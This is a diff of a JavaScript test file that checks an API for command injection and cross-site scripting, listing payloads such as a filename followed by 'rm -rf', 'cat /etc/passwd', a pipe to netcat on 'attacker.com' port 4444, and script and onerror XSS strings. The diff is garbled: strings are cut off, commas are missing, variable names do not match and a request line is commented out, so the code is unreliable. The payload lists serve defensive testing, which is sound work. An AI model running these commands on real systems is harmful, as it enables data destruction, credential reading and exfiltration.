@@ -116,7 +116,7 @@ expect(400)
     it('should prevent command injection', async() => {
       const _commandInjectionPayloads = [
 
-        'test.png; rm -rf 
+        'test.png; rm -rf '
         'test.png && cat /etc/passwd',
         'test.png | nc attacker.com 4444'];
   for(const _payload of commandInjectionPayloads) {
@@ -131,10 +131,10 @@ expect(400)
     it('should sanitize HTML to prevent XSS', async() => {
       const _xssPayloads = [
 
-        '<script>alert("XSS")<
+        '<script>alert("XSS")<'
         '<img src=x onerror=alert(1)>',
         'javascript:alert(1)',
-        '<svg
+        '<svg'
   for(const _payload of xssPayloads) {
 // const _response = awaitrequest(server); 
 post('/api/v1/projects')
